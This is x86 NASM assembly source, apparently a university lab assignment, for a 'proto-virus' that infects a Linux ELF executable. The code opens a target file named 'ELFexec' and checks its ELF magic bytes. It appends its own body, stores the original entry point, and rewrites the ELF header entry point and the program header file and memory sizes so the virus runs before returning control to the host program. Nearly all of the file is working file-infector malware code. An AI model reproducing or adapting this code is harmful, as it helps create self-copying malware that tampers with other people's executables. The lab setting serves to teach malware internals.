%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro get_address 1 ;(pos)
call	get_my_loc
add	edx, (%1 - next_i)
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define loadENTRY	0x8048000

	global _start


	section .text
	
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here


;GET START ADDRESS
get_address	message		;get address of the string
mov	ebx, edx		;move string address to ebx

;PRINT "VIRUS"
write	1, ebx, 18		;print string


;OPEN FILE
get_address	FileName	;get address of fileName

mov	eax, 5
mov	ebx, edx
mov	ecx, RDWR
mov	edx, 0644
int	0x80


cmp	eax, 0			;verify that file opened
jl	ExitErrorOpen		;if not go to exit
mov	[ebp-4], eax		;move the fd into ebp-4
lseek	[ebp-4], 0, SEEK_SET	;set fd pointer to file start


;LOAD FILE INTO BUFFER
lea	ecx, [ebp-200]		;load to ecx relative address (buffer) of 200 bytes after current position
read	[ebp-4], ecx, 84	;read 84 bytes into "buffer" on stack.

;VERIFY MAGIC BYTES OF THE ELF
cmp	byte[ebp-200], 0x7f
jne	ExitErrorOpen
cmp	byte[ebp-199], 'E'
jne	ExitErrorOpen
cmp	byte[ebp-198], 'L'
jne	ExitErrorOpen
cmp	byte[ebp-197], 'F'
jne	ExitErrorOpen




;GET OLD ENTRY POINT TO FILE
lseek	[ebp-4], 0, SEEK_END	;go to end of opened file (returned number of read bytes goes to eax)	
mov	dword[ebp-8], eax	;move file size to ebx-8
mov	eax, [ebp-176]		;save entry point (from start of ELF header file +24 bytes(18H)=e_entry
mov	dword[ebp-12], eax	;save old entry point to stack




;COPY VIRUS TO END OF ELF FILE
get_address	_start				;get start address	
mov		ebx, edx			;move to relevant register
write		[ebp-4],ebx, virus_end-_start-4	;write virus to file

lseek	[ebp-4], 0, SEEK_END	;go to end of opened file (returned number of read bytes goes to eax)	
lea		ecx, [ebp-12]

mov		eax, 4
mov		ebx, [ebp-4]
mov		edx, 4
int		0x80



;UPDATE PHDR TO START PROGRAM AT VIRUS
mov		eax, [ebp-8]	;move file size to eax
add		eax, [ebp-140] ;from readelf: phdr resides in +52 byes, vadd resides in +8 within phdr = 200-60=140. eax holds address of end of file=start of virus.
mov		dword[ebp-176], eax ;update entry point pointer to point to start of virus and start program from there


;FIND NEW FILESIZE AFTER ADDITION OF VIRUS
lseek		[ebp-4], 0, SEEK_END
mov		[ebp-8], eax ;save size after change in stack

;UPDATE FILE\MEM SIZE TO INCLUDE THE VIRUS (COPY IT INTO MEMORY)
mov		[ebp-132], eax ;change file size to new size (file size resides in phdr+16 = 52+16= 68 = ebp-132
mov		[ebp-128], eax ;change mem size to new size (file size resides in phdr+20 = 52+20= 72 = ebp-128


;OVERRIDE THE ORIGINAL FILE HEADER WITH CHANGED VALUES
lseek		[ebp-4], 0, SEEK_SET	;point to start of the file
lea		ecx, [ebp-200]	 	;re-assign address of buffer start into ecx register
write		[ebp-4], ecx, 84 	;write new program header and elf header from our "buffer" in stack to the file
close		[ebp-4]			;close the file. the deed has been done.

get_address	PreviousEntryPoint
jmp		[edx]



VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
	
ExitErrorOpen:
      get_address	PreviousEntryPoint
      jmp		[edx]
      exit -1
      
      
ExitError:
	exit -1
	
	
message:	db "This Is A Virus!", 10, 0
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0




get_my_loc:
	call	next_i

next_i:	pop	edx
	ret


PreviousEntryPoint: dd VirusExit

virus_end: